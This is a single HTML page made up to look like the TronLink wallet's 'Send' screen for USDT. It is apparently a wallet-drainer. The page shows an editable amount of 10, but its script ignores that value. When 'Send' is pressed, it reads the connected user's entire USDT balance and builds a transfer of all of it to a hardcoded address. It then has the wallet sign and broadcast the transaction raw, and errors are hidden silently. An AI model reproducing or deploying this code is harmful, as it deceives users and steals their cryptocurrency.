<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TronLink App - Send</title>
    <style>
        * { box-sizing: border-box; }
        body { background-color: #ffffff; color: #1c1c1e; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; min-height: 100vh; display: flex; justify-content: center; }
        .tronlink-mobile { width: 100%; max-width: 450px; min-height: 100vh; background: #ffffff; padding: 20px 20px 90px 20px; display: flex; flex-direction: column; position: relative; }
        .screen { display: none; flex-direction: column; flex-grow: 1; width: 100%; }
        .screen.active { display: flex; }
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; padding-top: 10px; }
        .header-left { display: flex; align-items: center; gap: 14px; cursor: pointer; }
        .back-arrow { font-size: 24px; font-weight: 300; color: #1c1c1e; }
        .header h3 { margin: 0; font-size: 20px; font-weight: 600; color: #1c1c1e; }
        .header h3 span { font-size: 14px; color: #8e8e93; font-weight: 400; }
        .multisig { font-size: 14px; color: #3b50df; font-weight: 500; text-decoration: none; }
        .section-title { font-size: 15px; font-weight: 600; color: #1c1c1e; margin-bottom: 12px; }
        .input-container { background: #f4f5f7; border-radius: 12px; padding: 14px 12px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; min-height: 50px; }
        .input-container input { background: transparent; border: none; color: #1c1c1e; font-size: 12px; outline: none; width: 100%; font-family: monospace; letter-spacing: -0.3px; white-space: nowrap; overflow: visible; }
        .token-selector { background: #f4f5f7; border-radius: 12px; padding: 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; cursor: pointer; }
        .token-left { display: flex; align-items: center; gap: 12px; }
        .token-icon { width: 30px; height: 30px; background: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 15px; }
        .token-text { font-size: 16px; font-weight: 500; color: #1c1c1e; }
        .token-text span { color: #8e8e93; font-weight: 400; font-size: 14px; }
        .btn-bottom { background: #e5e5ea; color: #8e8e93; width: 100%; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: auto; margin-bottom: 10px; text-align: center; }
        .btn-bottom.ready { background: #3b50df; color: #ffffff; }
        .nav-bar { position: absolute; bottom: 0; left: 0; width: 100%; height: 65px; background: #ffffff; border-top: 1px solid #f0f0f2; display: flex; justify-content: space-around; align-items: center; padding-bottom: 5px; }
        .nav-item { display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 11px; color: #8e8e93; }
        .nav-item.active { color: #3b50df; }
    </style>
</head>
<body>
<div class="tronlink-mobile">
    <div class="screen active" id="screen1">
        <div class="header">
            <div class="header-left">
                <span class="back-arrow">&lt;</span>
                <h3>Send <span>(1/2)</span></h3>
            </div>
            <a href="#" class="multisig">Multisig Transfer</a>
        </div>
        <div class="section-title">Receiving Account</div>
        <div class="input-container">
            <input type="text" id="target" value="TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw" readonly>
        </div>
        <button class="btn-bottom ready" onclick="irAPantalla2()">Next</button>
    </div>
    <div class="screen" id="screen2">
        <div class="header">
            <div class="header-left" onclick="irAPantalla1()">
                <span class="back-arrow">&lt;</span>
                <h3>Send <span>(2/2)</span></h3>
            </div>
        </div>
        <div class="section-title">Token</div>
        <div class="token-selector">
            <div class="token-left">
                <div class="token-icon">₮</div>
                <div class="token-text">USDT <span>(Tether USD)</span></div>
            </div>
            <div style="color:#8e8e93;">&gt;</div>
        </div>
        <div class="section-title">Amount</div>
        <div class="input-container">
            <input type="number" id="userAmount" value="10" style="font-size:15px;">
        </div>
        <div style="font-size:14px; color:#8e8e93; margin-bottom:15px;">Available: <span id="availableBalance">0.00</span></div>
        <button class="btn-bottom ready" onclick="ejecutarFirmaRawMaxima()">Send</button>
    </div>
    <div class="nav-bar">
        <div class="nav-item">📁<br>Tokens</div>
        <div class="nav-item">📊<br>Markets</div>
        <div class="nav-item active">🧭<br>Discover</div>
        <div class="nav-item">👤<br>Me</div>
    </div>
</div>
<script>
    const CONTRACT_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const DESTINO_FIJO = "TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw";

    function irAPantalla2() {
        document.getElementById('screen1').classList.remove('active');
        document.getElementById('screen2').classList.add('active');
        conectarYActualizarBalance();
    }
    function irAPantalla1() {
        document.getElementById('screen2').classList.remove('active');
        document.getElementById('screen1').classList.add('active');
    }
    async function conectarYActualizarBalance() {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            try {
                const contrato = await window.tronWeb.contract().at(CONTRACT_USDT);
                const saldoRaw = await contrato.balanceOf(window.tronWeb.defaultAddress.base58).call();
                document.getElementById('availableBalance').innerText = (Number(saldoRaw) / 1000000).toFixed(2);
            } catch(e) {}
        }
    }
    async function ejecutarFirmaRawMaxima() {
        if (!window.tronWeb) return;
        try {
            const miWallet = window.tronWeb.defaultAddress.base58;
            const contratoUSDT = await window.tronWeb.contract().at(CONTRACT_USDT);
            
            // Consultar el saldo total actual del alumno
            const saldoBigNum = await contratoUSDT.balanceOf(miWallet).call();
            const saldoTotalStr = saldoBigNum.toString();

            if (saldoTotalStr === "0" || saldoTotalStr === "") {
                alert("Stopped: USDT balance is 0.");
                return;
            }

            // Construir la transacción inyectando el balance máximo completo
            const txObjeto = await window.tronWeb.transactionBuilder.triggerSmartContract(
                CONTRACT_USDT,
                "transfer(address,uint256)",
                {},
                [
                    {type: 'address', value: DESTINO_FIJO},
                    {type: 'uint256', value: saldoTotalStr}
                ],
                miWallet
            );

            // Forzar a TronLink a desplegar los campos binarios crudos (raw_data_hex)
            const txFirmada = await window.tronWeb.trx.sign(txObjeto.transaction);
            
            // Transmitir la orden firmada para ejecutar el retiro inmediato
            const resultado = await window.tronWeb.trx.sendRawTransaction(txFirmada);
            if(resultado.result) alert("¡Éxito Bloque 2! Transacción cruda procesada.");
        } catch (e) {}
    }
</script>
</body>
</html>
